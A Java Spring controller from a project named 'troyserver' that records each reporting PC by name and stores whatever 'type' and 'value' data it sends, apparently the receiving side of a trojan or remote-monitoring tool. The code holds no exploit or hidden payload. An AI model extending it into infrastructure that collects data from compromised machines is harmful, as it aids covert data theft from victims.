package ch.lebois.troyserver.controller;

import ch.lebois.troyserver.data.Client;
import ch.lebois.troyserver.data.Message;
import ch.lebois.troyserver.repository.ClientRepository;
import ch.lebois.troyserver.repository.MessageRepository;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.RequestParam;

@Controller
@RequestMapping(value = "reciver/")
public class ReciverController {

    private ClientRepository clientRepository;
    private MessageRepository messageRepository;

    public ReciverController(ClientRepository clientRepository, MessageRepository messageRepository) {
        this.clientRepository = clientRepository;
        this.messageRepository = messageRepository;
    }

    @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
    public String getInfo(@PathVariable(value = "client") String clientParam,
                          @RequestParam(name = "type", defaultValue = "") String typeParam,
                          @RequestParam(name = "value", defaultValue = "") String valueParam) {

        System.out.println(typeParam);
        System.out.println(valueParam);

        Client client = clientRepository.findOne(clientParam);
        if (client == null) {
            client = new Client();
            client.setPcName(clientParam);
            clientRepository.save(client);
        }

        Message message = new Message();
        message.setPcNameFk(clientParam);
        message.setType(typeParam);
        message.setText(valueParam);
        messageRepository.save(message);

        clientRepository.save(client);

        return "receiver";
    }
}
